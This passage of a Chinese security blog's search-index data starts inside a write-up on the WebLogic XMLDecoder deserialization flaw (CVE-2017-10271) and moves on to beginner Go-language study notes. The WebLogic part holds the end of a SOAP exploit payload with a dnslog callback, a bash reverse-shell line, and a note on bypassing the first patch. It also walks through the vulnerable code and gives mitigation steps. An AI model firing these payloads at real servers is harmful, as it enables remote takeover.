weblogic.16qkmh.dnslog.cn&lt;/string>  \n&lt;/void>  \n&lt;/array>  \n&lt;void method=\"start\"/>&lt;/void>  \n&lt;/java>  \n&lt;/work:WorkContext>  \n&lt;/soapenv:Header>  \n&lt;soapenv:Body/>  \n&lt;/soapenv:Envelope>\n\n如果是弹 shell 脚本，需要将原本命令执行的地方修改如下\n&lt;string>bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string>\n\n漏洞分析首先看到 server/lib/wls-wsat.war/WEB-INF/web.xml 文件中存在许多接口，这些接口都可以对 SOAP 报文进行处理，也就是说，这些接口都存在 Weblogic XMLDecoder 反序列化的漏洞\n\n\n接着我们去到 weblogic.wsee.jaxws.workcontext.WorkContextServerTube#processRequest 方法，这个方法对接口数据进行了初步的处理，打断点进行调试。\n\n\n此处 var1 为我们的恶意 xml 数据，var2 获取了 xml header，也就是 text/xml，并将其转换为列表形式，var3 是从 var2 中获取 WorkAreaConstants.WORK_AREA_HEADER 得到的，最后将 var3 放入 readHeaderOld() 方法进行处理。\n\n\n跟进，在构造出 var6 之前，本质上都是在做赋值的工作，var4 获取了恶意 XML 数据里面的内容部分。关于 var6 的构造，我们需要跟进 WorkContextXmlInputAdapter 类的构造函数\n\n\n可以看到本质上是 new 了一个 XMLDecoder 类，并将 var4 的内容（XML 数据里的内容）赋了进去。继续往下，跟进 receive() 方法\n\n\nreceive() 方法生成了处理 XMLDecoder 类的处理器，进行下一步 receiveRequest() 的处理，再跟进\n\n\n再跟进 readEntry() 方法，readEntry() 方法调用了 readUTF() 方法，跟进 readUTF() 方法，上面一直在做层层封装的工作\n\n\n在 readUTF() 方法中，调用了 readObject() 方法，对 XML 数据进行反序列化解析。\n\n\n\n漏洞分析至此结束\n\n0x04 漏洞修复CVE-2017-3506 补丁分析这里补丁在 WorkContextXmlInputAdapter 中添加了 validate 验证，限制了 object 标签，从而限制通过 XML 来构造类\nprivate void validate(InputStream is) &#123;\n      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();\n      try &#123;\n         SAXParser parser = factory.newSAXParser();\n         parser.parse(is, new DefaultHandler() &#123;\n            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;\n               if(qName.equalsIgnoreCase(\"object\")) &#123;\n                  throw new IllegalStateException(\"Invalid context type: object\");\n               &#125;\n            &#125;\n         &#125;);\n      &#125; catch (ParserConfigurationException var5) &#123;\n         throw new IllegalStateException(\"Parser Exception\", var5);\n      &#125; catch (SAXException var6) &#123;\n         throw new IllegalStateException(\"Parser Exception\", var6);\n      &#125; catch (IOException var7) &#123;\n         throw new IllegalStateException(\"Parser Exception\", var7);\n      &#125;\n   &#125;\n\n绕过方法很简单，将 object 修改成 void，也就是最开始漏洞复现的 exp\nCVE-2017-10271 补丁分析private void validate(InputStream is) &#123;\n   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();\n   try &#123;\n      SAXParser parser = factory.newSAXParser();\n      parser.parse(is, new DefaultHandler() &#123;\n         private int overallarraylength = 0;\n         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;\n            if(qName.equalsIgnoreCase(\"object\")) &#123;\n               throw new IllegalStateException(\"Invalid element qName:object\");\n            &#125; else if(qName.equalsIgnoreCase(\"new\")) &#123;\n               throw new IllegalStateException(\"Invalid element qName:new\");\n            &#125; else if(qName.equalsIgnoreCase(\"method\")) &#123;\n               throw new IllegalStateException(\"Invalid element qName:method\");\n            &#125; else &#123;\n               if(qName.equalsIgnoreCase(\"void\")) &#123;\n                  for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) &#123;\n                     if(!\"index\".equalsIgnoreCase(attributes.getQName(attClass))) &#123;\n                        throw new IllegalStateException(\"Invalid attribute for element void:\" + attributes.getQName(attClass));\n                     &#125;\n                  &#125;\n               &#125;\n               if(qName.equalsIgnoreCase(\"array\")) &#123;\n                  String var9 = attributes.getValue(\"class\");\n                  if(var9 != null &amp;&amp; !var9.equalsIgnoreCase(\"byte\")) &#123;\n                     throw new IllegalStateException(\"The value of class attribute is not valid for array element.\");\n                  &#125;\n\n依然是进行黑名单判断\n\n临时解决方案\n\n根据业务所有需求，考虑是否删除 WLS-WebServices 组件。包含此组件路径为：\nMiddleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wls-wsat \nMiddleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;.internal&#x2F;wls-wsat.war \nMiddleware&#x2F;wlserver_10.3&#x2F;server&#x2F;lib&#x2F;wls-wsat.war\n\n以上路径都在 WebLogic 安装处。删除以上文件之后，需重启 WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为 404 页面。\n0x05 小结整体漏洞还是相对简单的，很快就能看过去，这个漏洞实际上也为很多 Web Service 的组件提供了思路。\n0x06 Refhttps://www.mi1k7ea.com/2021/04/05/%E6%B5%85%E6%9E%90WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/https://xz.aliyun.com/t/8465\n","categories":["漏洞复现"],"tags":["漏洞复现","Java","WebLogic"]},{"title":"GO 语言基础学习","url":"/2022/09/07/GO-%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/","content":"golang 基础学习\n\nGO 语言基础学习主要也是自己读书的一点笔记吧\n0x01 前言当时有一天在地铁上看微信读书的时候想起来：噢对我是时候写一点关于 Go 的笔记了，所以就有了这篇 Go 语言基础学习的文章。\n本文笔记基于 《Go 语言入门经典》\n0x02 环境搭建用 Goland 搭建项目，每次创建项目之后，我们都需要对 Goland 进行一些配置，在 Goland 的右上方找到“Add Configuration”并单击。\n\n\n选择 Directory，接着写 helloWorld 文件\n\n\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   fmt.Println(\"Hello World\")  \n&#125;\n\n\n\n0x03 GO 语言基础1. 类型字符串类型\npackage main  \n  \nimport \"fmt\"  \n  \nfunc sayHello(s string) string  &#123;  \n   return \"Hello \" + s  \n&#125;  \n  \nfunc main()  &#123;  \n   fmt.Println(sayHello(\"Drunkbaby\"))  \n&#125;\n\n\n\nint 类型\npackage main  \n  \nimport \"fmt\"  \n  \nfunc addition(x int, y int) int &#123;  \n   return x+y  \n&#125;  \n  \nfunc main()  &#123;  \n   fmt.Println(addition(2,4))  \n&#125;\n\nbool 类型\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   var b bool  \n   fmt.Println(b)  \n   b = true  \n   fmt.Println(b)  \n&#125;\n\n数值类型int：平平无奇\nfloat：氛围 float32 与 float64，一般用 float64 居多\n定义如下\nvar f float64 = 0.111\n\n类型转换\n此处提及两个包，一个是 reflect，一个是 srtconv\n\npackage main  \n  \nimport (  \n   \"fmt\"  \n   \"reflect\"   \"strconv\")  \n  \nfunc main()  &#123;  \n   var b bool = true  \n   fmt.Println(reflect.TypeOf(b))  \n   var s string = strconv.FormatBool(true)  \n   fmt.Println(reflect.TypeOf(s))  \n&#125;\n\n2. 变量字符串变量package main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   var s string = \"Hello World\"  \n   fmt.Println(s)  \n&#125;\n\n快捷声明变量package main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   var (  \n      s string = \"Drunkbaby\"  \n      i int = 4  \n   )  \n   fmt.Println(s)  \n   fmt.Println(i)  \n&#125;\n\n声明变量后，就不能再次声明它，不然会报错。\n变量零值package main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   var i int  \n   var f float64  \n   var b bool  \n   var s string  \n   fmt.Printf(\"%v %v %v %q\\n\", i, f, b, s)  \n&#125;\n\n\n\n编写简短变量:= 符号是简短变量声明\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   s := \"Hello World\"  \n   fmt.Println(s)  \n&#125;\n\n简短变量声明是最常用的变量声明方式，还有一些比较简洁的变量声明\npackage main  \n  \nimport \"fmt\"  \n  \nvar s = \"Hello World\"  \n  \nfunc main()  &#123;  \n   i := 42  \n   fmt.Println(s)  \n   fmt.Println(i)  \n&#125;\n\n有关作用域和其他语言是一样的，大括号作为作用域的分割，看代码。\npackage main  \n  \nimport \"fmt\"  \n  \nvar s2 = \"Hello World\"  \n  \nfunc main()  &#123;  \n   fmt.Printf(\"Print 's2' variable from outer block %v\\n\", s2)  \n   b := true  \n   if b &#123;  \n      fmt.Printf(\"Printing 'b' variable from outer block %v\\n\", b)  \n      i := 42  \n      if b != false &#123;  \n         fmt.Printf(\"Printing 'i' variable from outer block %v\\n\", i)  \n      &#125;  \n   &#125;  \n&#125;\n\n指针package main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   s := \"Hello World\"  \n   fmt.Println(&amp;s)  \n&#125;\n\n输出一个十六进制的内存地址\n\n\n将变量作为值传递时，地址不变\npackage main  \n  \nimport \"fmt\"  \n  \nfunc showMemoryAddress(x *int)  &#123;  \n   fmt.Println(x)  \n   return  \n&#125;  \n  \nfunc main()  &#123;  \n   i := 1  \n   fmt.Println(&amp;i)  \n   showMemoryAddress(&amp;i)  \n&#125;\n\n\n\n如果要使用指针指向变量的值，而非内存地址，应当在指针变量前加上星号。\nfunc showMemoryAddress(x *int)  &#123;  \n   fmt.Println(*x)  \n   return  \n&#125;  \n\n声明常量package main  \n  \nimport \"fmt\"  \n  \nconst greeting string = \"Hello World\"  \n  \nfunc main()  &#123;  \n   greeting = \"Goodbye, fuck security\"  \n   fmt.Println(greeting)  \n&#125;\n\nconst 常量无法被修改，所以会报错\n\n\n3. 函数返回多个值package main  \n  \nimport \"fmt\"  \n  \nfunc getPrize() (int, string) &#123;  \n   i := 2  \n   s := \"Drunkbaby\"  \n   return i, s  \n&#125;  \n  \nfunc main()  &#123;  \n   quantity, prize := getPrize()  \n   fmt.Printf(\"You won %v %v\\n\", quantity, prize)  \n&#125;\n\n不定参数函数很有意思，是用三个点的，变量 numbers 是一个包含所有参数的切片。\n代码如下\npackage main  \n  \nimport \"fmt\"  \n  \nfunc sumNumbers(numbers... int) int &#123;  \n   total := 0  \n   for _, number := range numbers &#123;  \n      total += number  \n   &#125;  \n   return total  \n&#125;  \n  \nfunc main()  &#123;  \n   result := sumNumbers(1, 2, 3, 4)  \n   fmt.Printf(\"The result is %v\\n\", result)  \n&#125;\n\n具名返回值按照声明顺序返回具体名称变量值。\npackage main  \n  \nimport \"fmt\"  \n  \nfunc sayHi() (x, y string) &#123;  \n   x = \"hello\"  \n   y = \"world\"  \n   return  \n&#125;  \n  \nfunc main()  &#123;  \n   fmt.Println(sayHi())  \n&#125;\n\n递归函数package main  \n  \nimport \"fmt\"  \n  \nfunc feedMe(portion int, eaten int) int &#123;  \n   eaten = portion + eaten  \n   if eaten >= 5 &#123;  \n      fmt.Printf(\"I'm full! I've eaten %d\\n\", eaten)  \n      return eaten  \n   &#125;  \n   fmt.Printf(\"I'm still hungry! I've eaten %d\\n\", eaten)  \n   return feedMe(portion, eaten)  \n&#125;  \n  \nfunc main()  &#123;  \n   feedMe(1, 0)\n&#125;\n\n将函数作为值传递package main  \n  \nimport \"fmt\"  \n  \nfunc anotherFunction(f func() string) string &#123;  \n   return f()  \n&#125;  \n  \nfunc main()  &#123;  \n   fn := func() string &#123;  \n      return \"function called\"  \n   &#125;  \n   fmt.Println(anotherFunction(fn))  \n&#125;\n\n4. 控制流程ifpackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   b := true  \n   if b &#123;  \n      fmt.Println(\"b is true!\")  \n   &#125;  \n&#125;\n\nelsepackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   b := false  \n   if b &#123;  \n      fmt.Println(\"b is true\")  \n   &#125; else &#123;  \n      fmt.Println(\"b is false\")  \n   &#125;  \n&#125;\n\nelseifpackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   i := 3  \n   if i == 3 &#123;  \n      fmt.Println(\"i is 3\")  \n   &#125; else if i == 2 &#123;  \n      fmt.Println(\"i is 2\")  \n   &#125;  \n&#125;\n\n运算符\n算术运算符\n\n\n\n\n逻辑运算符\n\n\n\nswitch，可以说是 if 的高级用法了package main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   i := 2  \n  \n   switch i &#123;  \n   case 2:  \n      fmt.Println(\"Two\")  \n   case 3:  \n      fmt.Println(\"Three\")  \n   case 4:  \n      fmt.Println(\"Four\")  \n   &#125;  \n&#125;\n\ndefault in switch 语句\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   s := \"c\"  \n  \n   switch s &#123;  \n   case \"a\":  \n      fmt.Println(\"The letter is a!\")  \n   case \"b\":  \n      fmt.Println(\"The letter is b!\")  \n   default:  \n      fmt.Println(\"I don't recognize that letter\")  \n   &#125;  \n&#125;\n\nfor 循环package main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   i := 0  \n   for i &lt; 10 &#123;  \n      i++  \n      fmt.Println(\"i is\", i)  \n   &#125;  \n&#125;\n\n简化写法，也是最常规的写法\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   for i := 0; i &lt; 10; i++ &#123;  \n      fmt.Println(\"i is\", i)  \n   &#125;  \n&#125;\n\n包含 range 子句的 for 语句package main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   numbers := []int&#123;1,2,3,4&#125;  \n   for i, n := range numbers &#123;  \n      fmt.Println(\"The index of the loop is\", i)  \n      fmt.Println(\"The value from the array is\", n)  \n   &#125;  \n&#125;\n\ndefer 语句defer 是一个很有用的 Go 语言功能，它能够让程序在函数返回前执行另一个函数。函数在遇到 return 语句或到达函数末尾的时候返回。defer 语句通常用于执行清理操作或确保操作。\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   defer fmt.Println(\"I am run after the function completes\")  \n   fmt.Println(\"Hello World\")  \n&#125;\n\n\n在执行完 main 函数后执行 defer 函数\n\n\n\n5. 数组、切片和映射数组的相关基础操作package main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   var cheeses [2]string  \n   cheeses[0] = \"Silly\"  \n   cheeses[1] = \"Drunkbaby\"  \n   fmt.Println(cheeses[0])  \n   fmt.Println(cheeses[1])  \n   fmt.Println(cheeses)  \n&#125;\n\n\n\n声明数组的变量之后，就不能给它再添加元素了，比如此处我想 cheeses[2]=&quot;boy&quot; 就会报错\n切片\n一些书面语比较难以理解，我们可以讲的简易一些，切片≈数组\n\n切片是底层数组中的一个连续片段，，通过它可以访问该数组中一系列带编号的元素，因此，切片可以让我们访问数组的特定部分，比较像索引吧。\n在切片中添加元素其实我并不喜欢这种说法，更像是给数组增加元素。\n用的方法是直接 append，，很有意思，不像 Java 里面是 xxx.append()，可以同时添加多个元素\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   var cheeses = make([]string, 2)  \n   cheeses[0] = \"Silly\"  \n   cheeses[1] = \"Drunkbaby\"  \n   cheeses = append(cheeses, \"Boy\", \"too\", \"silly\")  \n   fmt.Println(cheeses)  \n&#125;\n\n从切片中删除元素也是用 append\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   var cheeses = make([]string, 3)  \n   cheeses[0] = \"Silly\"  \n   cheeses[1] = \"Drunkbaby\"  \n   cheeses[2] = \"Baby\"  \n   fmt.Println(len(cheeses))  \n   fmt.Println(cheeses)  \n   cheeses = append(cheeses[:2], cheeses[2+1:]...)  \n   fmt.Println(len(cheeses))  \n   fmt.Println(cheeses)  \n&#125;\n\n\n\n切片元素复制用的是 copy\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   var cheeses = make([]string, 2)  \n   cheeses[0] = \"Silly\"  \n   cheeses[1] = \"Drunkbaby\"  \n   var smeelyCheeses = make([]string, 2)  \n   copy(smeelyCheeses, cheeses)  \n   fmt.Println(smeelyCheeses)  \n&#125;\n\n映射映射读起来比较别扭，比较像 Java 里面的 Map，也就是键值对\n\n创建空映射\n\nvar players= make(map[string］int)\n\n对应的放 key value 并不是用 put 方法，而是如此\nplayers[\"cook\"] = 32\nplayers[\"bairstow\"] = 27\nplayers[\"stokes\"] = 26\n\n从映射中删除元素package main  \n  \nimport \"fmt\"  \n  \nfunc main()  &#123;  \n   var players = make(map[string]int)  \n   players[\"cook\"] = 32  \n   players[\"bairstow\"] = 27  \n   players[\"stokes\"] = 26  \n   delete(players, \"cook\")  \n   fmt.Println(players)  \n&#125;\n\n6. 结构体与指针一个基础的结构体结构体与类差不多，概念方面不再赘述\npackage main  \n  \nimport \"fmt\"  \n  \ntype Movie struct &#123;  \n   Name string  \n   Rating float32  \n&#125;  \n  \nfunc main()  &#123;  \n   m := Movie&#123;  \n      Name: \"Drunkbaby\",  \n      Rating: 10,  \n   &#125;  \n   fmt.Println(m.Name, m.Rating)  \n&#125;\n\n\n\n“实例化一个 struct 实例”\n和 new 一个 class 一样，比较简单\n\npackage main  \n  \nimport \"fmt\"  \n  \ntype Person struct &#123;  \n   Name string  \n   Rating float32  \n&#125;  \n  \nfunc main()  &#123;  \n   var m Person  \n   fmt.Printf(\"%+v\\n\", m)  \n   m.Name = \"Drunkbaby\"  \n   m.Rating = 10  \n   fmt.Printf(\"%+v\\n\", m)  \n&#125;\n\n\n\n“new 一个 struct 实例”package main  \n  \nimport \"fmt\"  \n  \ntype Student struct &#123;  \n   Name string  \n   Age float32  \n&#125;  \n  \nfunc main()  &#123;  \n   m := new(Student)  \n   m.Name = \"Drunkbaby\"  \n   m.Age = 10  \n   fmt.Printf(\"%+v\\n\", m)  \n&#125;\n\n嵌套结构体结构体内包含结构体\npackage main  \n  \nimport \"fmt\"  \n  \ntype Superhero struct &#123;  \n   Name string  \n   Age int  \n   Address Address  \n&#125;  \n  \ntype Address struct &#123;  \n   Number int  \n   Street string  \n   City string  \n&#125;  \n  \nfunc main()  &#123;  \n   e := Superhero&#123;  \n      Name: \"Batman\",  \n      Age: 32,  \n      Address: Address&#123;  \n         Number: 1007,  \n         Street: \"Mountain Drive\",  \n         City: \"Gotham\",  \n      &#125;,  \n   &#125;  \n   fmt.Printf(\"%+v\\n\", e)  \n&#125;\n\n\n\n结构体的构造函数\n简单。。。\n\npackage main  \n  \nimport \"fmt\"  \n  \ntype Alarm struct &#123;  \n   Time string  \n   Sound bool  \n&#125;  \n  \nfunc NewAlarm(time string) Alarm &#123;  \n   a := Alarm&#123;  \n      Time: time,  \n      Sound: true,  \n   &#125;  \n   return a  \n&#125;  \n  \nfunc main()  &#123;  \n   fmt.Printf(\"%+v\\n\", NewAlarm(\"07:00\"))  \n&#125;\n\n结构体进行比较这个挺有意思哈哈\npackage main  \n  \nimport \"fmt\"  \n  \ntype Drink struct &#123;  \n   Name string  \n   Ice bool  \n&#125;  \n  \nfunc main()  &#123;  \n   a := Drink&#123;  \n      Name: \"Lemonade\",  \n      Ice: true,  \n   &#125;  \n   b := Drink&#123;  \n      Name: \"Lemonade\",  \n      Ice: true,  \n   &#125;  \n   if a == b &#123;  \n      fmt.Println(\"a and b are the same\")  \n   &#125;  \n   fmt.Printf(\"%+v\\n\", a)  \n   fmt.Printf(\"%+v\\n\", b)  \n&#125;\n\n检查结构体类型在 go 里面用的是 reflect，挺有意思的，在 Java 里面这也被称作反射，不愧是反射，能够看到结构体是什么\nfmt.Println(reflect.TypeOf(a))  \nfmt.Println(reflect.TypeOf(b))\n\n区分指针引用和值引用\n这就是老师特别喜欢讲的，变了一个，另外一个会不会变\n\n\n先说结论值引用，两个无关联指针引用，一个变另外一个跟着变\n\n值引用\npackage main  \n  \nimport \"fmt\"  \n  \ntype work struct &#123;  \n   Name string  \n   isWork bool  \n&#125;  \n  \nfunc main()  &#123;  \n   a := work&#123;  \n      Name: \"Fire\",  \n      isWork: true,  \n   &#125;  \n   b := a  \n   b.isWork = false  \n   fmt.Printf(\"%+v\\n\", b)  \n   fmt.Printf(\"%+v\\n\", a)  \n   fmt.Printf(\"%p\\n\", &amp;a)  \n   fmt.Printf(\"%p\\n\", &amp;b)  \n&#125;\n\n\n\n指针引用\n两个一起变\npackage main  \n  \nimport \"fmt\"  \n  \ntype Teacher struct &#123;  \n   Name string  \n   isWorking bool  \n&#125;  \n  \nfunc main()  &#123;  \n   a := Teacher&#123;  \n      Name: \"Drunkbaby\",  \n      isWorking: true,  \n   &#125;  \n   b := &amp;a  \n   b.isWorking = false  \n   fmt.Printf(\"%+v\\n\", *b)  \n   fmt.Printf(\"%+v\\n\", a)  \n   fmt.Printf(\"%p\\n\", b)  \n   fmt.Printf(\"%p\\n\", &amp;a)  \n&#125;\n\n\n\n将指向的指针（而不是本身）赋给 ，这是使用和号字符表示的。由于 b 是指针，因此必须使用星号字符对其进行引用\n7. 创建方法与接口方法，也就是类的函数，和 Java 当中的 “方法”是一样的，那么在 Go 中需要如何定义呢？\n比如我有一个类（结构体），代码如下\npackage main  \n  \ntype Movie struct &#123;  \n   Name string  \n   Rating float64  \n&#125;  \n  \nfunc (m *Movie) summary() string &#123;  \n   return \"1\"  \n&#125;\n\n需要我们在方法名前，加入 m *struct 才可以\n声明与调用方法package main  \n  \nimport (  \n   \"fmt\"  \n   \"strconv\")  \n  \ntype Movie struct &#123;  \n   Name string  \n   Rating float64  \n&#125;  \n  \nfunc (m *Movie) summary() string &#123;  \n   r := strconv.FormatFloat(m.Rating, 'f', 1, 64)  \n   return m.Name + \", \" + r  \n&#125;  \n  \nfunc main()  &#123;  \n   m := Movie&#123;  \n      Name: \"SpiderMan\",  \n      Rating: 3.2,  \n   &#125;  \n  \n   fmt.Println(m.summary())  \n&#125;\n\n\n\n当然一个类可以有多个方法\n值传递与指针传递\n方法传参，就是很平常。\n\npackage main  \n  \nimport \"fmt\"  \n  \ntype Triangle struct &#123;  \n   base float64  \n   height float64  \n&#125;  \n  \nfunc (t Triangle) changeBase(f float64) &#123;  \n   t.base = f  \n   return  \n&#125;  \n  \nfunc (t *Triangle) changeBasePointer(f float64) &#123;  \n   t.base = f  \n   return  \n&#125;  \n  \nfunc main()  &#123;  \n   t := Triangle&#123;  \n      base: 3,  \n      height: 1,  \n   &#125;  \n   t.changeBase(4)  \n   fmt.Println(t.base)  \n   t.changeBasePointer(4)  \n   fmt.Println(t.base)  \n&#125;\n\n\n如果需要修改原始结构体，就选指针。如果不需要修改原始结构体，就使用值。\n\n接口固定格式\ntype name interface &#123;\n\n&#125;\n\n// 在里面可以定义方法\n\n我的理解是，接口里面定义方法，然后让具体的类去实现，但是这个类的实现就很微妙。。。。。。。。。。可以说基本没什么关联。无语\npackage main  \n  \nimport (  \n   \"errors\"  \n   \"fmt\")  \n  \ntype Robot interface &#123;  \n   PowerOn() error  \n&#125;  \n  \ntype T850 struct &#123;  \n   Name string  \n&#125;  \n  \nfunc (a *T850) PowerOn() error &#123;  \n   return nil  \n&#125;  \n  \ntype R2D2 struct &#123;  \n   Broken bool  \n&#125;  \n  \nfunc (r R2D2) PowerOn() error  &#123;  \n   if r.Broken &#123;  \n      return errors.New(\"R2D2 is broken\")  \n   &#125; else &#123;  \n      return nil  \n   &#125;  \n&#125;  \n  \nfunc Boot(r Robot) error &#123;  \n   return r.PowerOn()  \n&#125;  \n  \nfunc main() &#123;  \n   t := T850&#123;  \n      Name: \"The Terminator\",  \n   &#125;  \n  \n   r := R2D2&#123;  \n      Broken: true,  \n   &#125;  \n  \n   err := Boot(&amp;r)  \n  \n   if err != nil &#123;  \n      fmt.Println(err)  \n   &#125; else &#123;  \n      fmt.Println(\"Robot is powered on\")  \n   &#125;  \n  \n   err = Boot(&amp;t)  \n  \n   if err != nil &#123;  \n      fmt.Println(err)  \n   &#125; else &#123;  \n      fmt.Println(\"Robot is powered on\")  \n   &#125;  \n&#125;\n\n8. 字符串一些基础的操作就不讲了，直接看一些我认为有意思的地方\n使用缓冲区(stringBuffer)拼接字符串package main  \n  \nimport (  \n   \"bytes\"  \n   \"fmt\")  \n  \nfunc main()  &#123;  \n   var buffer bytes.Buffer  \n  \n   for i := 0; i &lt; 500; i++ &#123;  \n      buffer.WriteString(\"z\")  \n   &#125;  \n  \n   fmt.Println(buffer.String())  \n&#125;\n\n原理同 Java\n进制表示\n\n小写使用 ToLower() 接口\n查找使用 strings.Index()，如果找到，则输出第一个字串的索引开始；若找不到，则输出 -1\n删除字符串中的空格\n删除前后空格\n\npackage main  \n  \nimport (  \n   \"fmt\"  \n   \"strings\")  \n  \nfunc main()  &#123;  \n   fmt.Println(strings.TrimSpace(\" I don't need all the space \"))  \n&#125;\n\n9. Map 相关操作Map 是 key-value 的键值对数据结构，类似于集合的意思\n创建 map （但必须分配空间）原本逻辑上声明 map，从 Java 的角度来说没什么问题\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main() &#123;  \n   var a map[int]string  \n   fmt.Println(a)  \n&#125;\n\n但是这个程序，我们是不能进行赋值的，原因是并没有给此 map，也就是变量 a 分配内存空间，如果我们尝试赋值，如下语句，是会报错的\na[1]=\"Drunkbaby\"\n\n\n\n那么要如何才能分配空间并赋值呢？这里我们创建一个空的 map 需要用 make，完整有效代码如下\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main() &#123;  \n   // 创建空 map，却没有分配空间  \n   var a map[int]string  \n   // 在使用 map 前，需要先 make，make 的作用就是给 map 分配数据空间  \n   a = make(map[int]string, 10)  \n   a[1] = \"Drunkbaby;\"  \n   fmt.Println(a)  \n&#125;\n\n\n\n同样可以自己赋值 a[2] = &quot;silly&quot;；\n但是再写 a[1] = &quot;quan9i&quot;，那么之前的 a[1] = &quot;Drunkbaby&quot; 会被覆盖\n代码如下\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main() &#123;  \n   // 创建空 map，却没有分配空间  \n   var a map[int]string  \n   // 在使用 map 前，需要先 make，make 的作用就是给 map 分配数据空间  \n   a = make(map[int]string, 10)  \n   a[1] = \"Drunkbaby;\"  \n   a[2] = \"cute\"  \n   a[1] = \"quan9i\"  \n   fmt.Println(a)  \n&#125;\n\n结果如图，覆盖了 a[1]，且是有序的\n\n\n一般声明方式比较多的是这样\nvar cities = make(map[string]string)\n\n// 或者是\ncities := make(map[string]string)\n\n简单练习案例package main  \n  \nimport \"fmt\"  \n  \n// 练习案例  \n/*  \n课堂练习：演示一个 key-value 的 value 是 map 的案例  \n比如：我们要存放3个学生的信息，每个学生有 name 和 sex 信息  \n思路：map[string]map[string]string  \n*/  \n  \nfunc main() &#123;  \n   studentMap := make(map[string]map[string]string)  \n   studentMap[\"stu01\"] = make(map[string]string, 2)  \n   studentMap[\"stu01\"][\"name\"] = \"Drunkbaby\"  \n   studentMap[\"stu01\"][\"sex\"] = \"男\"  \n  \n   studentMap[\"stu02\"] = make(map[string]string, 2)  \n   studentMap[\"stu02\"][\"name\"] = \"D1ng\"  \n   studentMap[\"stu02\"][\"sex\"] = \"女\"  \n  \n   fmt.Println(studentMap[\"stu01\"])  \n   fmt.Println(studentMap[\"stu02\"])  \n&#125;\n&#125;\n\n\n\n同样还可以这样取值\nfmt.Println(studentMap[\"stu01\"][\"name\"])\n\nMap 的增删改查增加和更新\n根据 key 是否存在，如果 key 存在就是更新，不存在就是增加\npackage main  \n  \nimport \"fmt\"  \n  \nfunc main() &#123;  \n   cities := make(map[string]string)  \n  \n   cities[\"no1\"] = \"北京\"  \n   cities[\"no2\"] = \"上海\"  \n   cities[\"no3\"] = \"广州\"  \n  \n   fmt.Println(cities)  \n  \n   cities[\"no3\"] = \"上海 ~\"  \n   fmt.Println(cities)  \n&#125;\n\n\n\n删除\npackage main  \n  \nimport \"fmt\"  \n  \n// 增加与更新  \n  \nfunc main() &#123;  \n   cities := make(map[string]string)  \n  \n   cities[\"no1\"] = \"北京\"  \n   cities[\"no2\"] = \"上海\"  \n   cities[\"no3\"] = \"广州\"  \n  \n   fmt.Println(cities)  \n  \n   // 演示删除  \n   delete(cities, \"no1\")  \n   fmt.Println(cities)  \n   // 当 delete 指定的 key 不存在时，删除不会操作，也不会报错  \n   delete(cities, \"no4\")  \n   fmt.Println(cities)  \n&#125;\n\n\n\n\n删除细节说明\n\n如果要删除 map 当中所有的 key，有如下两种方法\n1、遍历所有的 key，逐一删除2、直接 make 一个新的空间，让老空间被 GC\nMap 查询\npackage main  \n  \nimport \"fmt\"  \n  \n// 增加与更新  \n  \nfunc main() &#123;  \n   cities := make(map[string]string)  \n  \n   cities[\"no1\"] = \"北京\"  \n   cities[\"no2\"] = \"上海\"  \n   cities[\"no3\"] = \"广州\"  \n  \n   fmt.Println(cities)  \n  \n   key, flag := cities[\"no1\"]  \n   if flag &#123;  \n      fmt.Println(\"no1 的 key 为\", key)  \n   &#125;  \n&#125;\n\n\n\nMap 的遍历Map 的遍历不能简单的用 for 循环\npackage main  \n  \nimport \"fmt\"  \n  \n// 增加与更新  \n  \nfunc main() &#123;  \n   cities := make(map[string]string)  \n  \n   cities[\"no1\"] = \"北京\"  \n   cities[\"no2\"] = \"上海\"  \n   cities[\"no3\"] = \"广州\"  \n  \n   for k, v := range cities &#123;  \n      fmt.Printf(\"k=%v v=%v\\n\", k, v)  \n   &#125;  \n&#125;\n\n和 python 基本上差不多\n\n那如果要遍历复杂的 Map 呢？就像我们之前讲的那一个案例，Map 套 Map\n\npackage main  \n  \nimport \"fmt\"  \n  \n// 遍历循环一个较为复杂的 Map  \nfunc main() &#123;  \n   studentMap := make(map[string]map[string]string)  \n   studentMap[\"stu01\"] = 